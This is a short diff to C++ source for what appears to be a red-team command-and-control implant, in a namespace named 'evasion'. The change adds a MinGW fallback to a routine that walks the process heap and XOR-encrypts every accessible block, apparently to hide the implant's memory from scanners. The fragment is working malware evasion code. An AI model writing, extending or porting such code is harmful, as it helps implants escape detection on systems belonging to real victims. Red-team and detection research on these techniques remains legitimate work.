@@ -1,7 +1,9 @@
 #ifdef _WIN32
 #include <windows.h>
+#include <wincrypt.h>
 #include <intrin.h>
 #include <vector>
+#include <cstdint>
 #include <cstring>
 
 namespace rtlc2 { namespace evasion {
@@ -86,12 +88,21 @@ static void ProcessHeap(HANDLE heap, bool isDefaultHeap) {
         // Skip the g_heapKey vector's internal storage
         // (The vector object itself is on the stack/global, but its
         //  data buffer is heap-allocated)
+#ifdef _MSC_VER
         __try {
             XorBlock(entry.lpData, entry.cbData,
                      g_heapKey.data(), g_heapKey.size());
         } __except(EXCEPTION_EXECUTE_HANDLER) {
             // Skip inaccessible blocks (guard pages, etc.)
         }
+#else
+        // MinGW: no SEH, check memory access with IsBadReadPtr
+        if (!IsBadReadPtr(entry.lpData, entry.cbData) &&
+            !IsBadWritePtr(entry.lpData, entry.cbData)) {
+            XorBlock(entry.lpData, entry.cbData,
+                     g_heapKey.data(), g_heapKey.size());
+        }
+#endif
     }
 
     HeapUnlock(heap);
